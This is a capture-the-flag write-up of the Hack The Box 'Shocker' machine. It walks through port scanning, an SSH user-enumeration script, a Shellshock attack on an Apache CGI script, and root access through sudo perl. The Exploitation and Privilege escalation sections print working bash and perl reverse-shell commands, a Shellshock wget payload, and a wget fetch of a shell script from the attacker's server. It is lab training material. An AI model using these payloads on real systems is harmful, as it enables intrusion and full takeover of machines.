+++
draft = false
date = 2020-06-15T16:04:02+01:00
title = "Shocker"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 3  
+++


# Machine info

- OS : Linux
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.56


# Mind Map
![Lame_MindMap](/images/htb/shocker_mindmap.png)


# Reconnaisance

Initial scan to check open ports:

{{< highlight bash >}}
sudo nmap -sSV -p- -n 10.10.10.56 -oA nmap/sSV_scan
{{< /highlight >}}


Scan result:

{{< highlight html >}}

Nmap scan report for 10.10.10.56
Host is up (0.064s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

{{< /highlight >}}

**Note:** Scanning in TCP mode (-ST) and in UDP mode (-sU) don't reveal any new open port.

# Enumeration

### SSH

The OpenSSH 7.2p2 service is vulnerable to **CVE:2016-6210**.

> By sending large passwords, a remote user can enumerate users on system that runs SSHD. This problem exists in most
modern configuration due to the fact that it takes much longer to calculate SHA256/SHA512 hash than BLOWFISH hash.

Here is the python script:

{{< highlight python >}}

import paramiko
import time
user=raw_input("user: ")
p='A' * 25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect('127.0.0.1', username=user,
        password=p)
except:
        endtime=time.clock()
total=endtime-starttime
print(total)

{{< /highlight >}}

**Note**: Valid users will result in higher total time.

With this method I was able to discover only the *root* user (nothing special), and then tried to brute force ssh with *Hydra* and *Medusa*, but without success.


### HTTP

The web page hosted at port 80 shows nothing more that an image. No links and the web page source code is not interesting.

I try to search for common URLs like resources like /index.php, /login.php, /cgi-bin and I can see that the server is running CGI as I receive a 403 status code - Forbidden - visiting `http://10.10.10.56/cgi-bin/`

**-> CGI programs are of primary concern in regards to shellshock vulnerabilities.**


![Shellshock](/images/htb/shellshock.png)

-> A very good article about this vulnerability: https://blog.cloudflare.com/inside-shellshock/

# Exploitation

The Metasploit module `apache_mod_cgi_bash_env` helps in checking for shellshock exploitability. In order for the module to work I need to specify an available CGI program / file to test. To find a valid resource I can conduct a dictionary attack on the web server and see If I can find something useful for the purpose:

{{< highlight bash >}}

sudo /opt/dirsearch/dirsearch.py -u http://10.10.10.56/cgi-bin/ -e sh,cgi -r -f

{{< /highlight >}}

Where:

- `/opt/dirsearch/` is the folder where the dirsearch script is located on my machine
- `-u` stands for URL
- `-e` stands for extensions to test
- `-r` and `-f` stands for recursive mode and force extensions for every wordlist entry respectively

It takes some time for the script to run, but at the end I'm able to find the file `user.sh` which returns a **200** code:

{{< highlight html >}}

[17:03:56] 403 -  305B  - /cgi-bin/.htpasswrd/
[17:03:56] 403 -  305B  - /cgi-bin/.htusers.sh
[17:03:56] 403 -  306B  - /cgi-bin/.htusers.cgi
[17:03:56] 403 -  303B  - /cgi-bin/.htusers/
[17:06:14] 200 -  118B  - /cgi-bin/user.sh

{{< /highlight  >}}

At this point I can configure the previous module in Metasploit setting the following options:

{{< highlight html >}}

set RHOSTS : 10.10.10.56
set RPORT : 80
set TARGETURI : /cgi/bin/user.sh

{{< /highlight  >}}

The module will try by default to run the command `/usr/bin/id` on the server. If the module returns the result of the `id` command, that means the server is vulnerable to shellshock and I'm able to run any command I want on it!

{{< highlight html >}}

msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

{{< /highlight >}}

The module returned the id! Great!

At this point I can set any command I want to run setting the CMD value in the Metasploit module. This **bash reverse shell** will do the trick:


`set CMD /bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1`


**Note**: I'm not using netcat here to connect because I'm not sure If it is installed on the target machine.

Where:

- `bash -i` invokes bash with an 'interactive' option
- `>&` redirects stdout and stderr to the specified target
- `/dev/tcp/10.10.14.18/4444` is a TCP client connection to IP/PORT
- `0>&1` redirects stdin (0) to stdout (1), so the opened TCP connection is used to read the input

Another way to accomplish this could be done with the *wget* command as follows:

{{< highlight bash >}}
wget -U '() { test;}; echo; /bin/bash -i>& /dev/tcp/10.10.14.18/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh
--2020-06-16 18:55:20--  http://10.10.10.56/cgi-bin/user.sh
Connecting to 10.10.10.56:80... connected.
HTTP request sent, awaiting response...
{{< /highlight >}}

I can see the connection coming back to my netcat listener:

{{< highlight html >}}

nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 45352
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly

{{< /highlight >}}

# Privilege escalation

Let's see what the user shelly can sudo without providing a password:

{{< highlight html >}}

shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

{{< /highlight >}}

She can run the perl program with root privilege, great! That means that I can upload a perl reverse shell on the machine and run it with root privileges in order to have a connection back on my machine!

Let's first set up a netcat listener:

{{< highlight html >}}

nc -nlvp 4456
listening on [any] 4456 ...

{{< /highlight  >}}

I have a perl reverse shell under `/usr/share/webshells`. I have to edit the *perl-reverse-shell.pl* file to specify where to send the reverse shell:

{{< highlight html >}}

# Where to send the reverse shell.  Change these.
my $ip = '10.10.14.18';
my $port = 4456;

{{< /highlight >}}

At this point I can set up a python server and retrieve the shell from the target machine:

{{< highlight html >}}

python -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...

{{< /highlight >}}

On target:

{{< highlight html >}}

shelly@Shocker:/home/shelly$ wget http://10.10.14.18:8888/perl-reverse-shell.pl
$ wget http://10.10.14.18:8888/perl-reverse-shell.pl                        
--2020-06-16 14:14:01--  http://10.10.14.18:8888/perl-reverse-shell.pl
Connecting to 10.10.14.18:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3714 (3.6K) [text/x-perl]
Saving to: 'perl-reverse-shell.pl'

     0K ...                                                   100% 1.65M=0.002s

2020-06-16 14:14:01 (1.65 MB/s) - 'perl-reverse-shell.pl' saved [3714/3714]


{{< /highlight >}}

Now I can launch the perl reverse shell and see I get a connection back with root privileges! That was easy!

On target:

{{< highlight html >}}

shelly@Shocker:/home/shelly$ sudo /usr/bin/perl perl-reverse-shell.perl
sudo /usr/bin/perl perl-reverse-shell.perl
Content-Length: 0
Connection: close
Content-Type: text/html

shelly@Shocker:/home/shelly$ Content-Length: 42
Connection: close
Content-Type: text/html

Sent reverse shell to 10.10.14.18:4456

{{< /highlight >}}

On my machine:

{{< highlight html >}}
nc -nlvp 4456
listening on [any] 4456 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 58268
 14:17:48 up  7:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# whoami
root
#
{{< /highlight >}}

**Note**: flags are under /home and /root

## Lessons learned and remediations

- As they always say, **enumeration is key**!
- The administrator should have restricted access to all the files in the /cgi-bin directory, because from there I was able to exploit the Shellshock vulnerability.

- The administrator should have patched his system against the Shellshock vulnerability (the patch exists).

- The ability to run perl with root privileges gave me a chance to obtain full control on the machine. The administrator should check that configuration to see if it is strictly necessary.
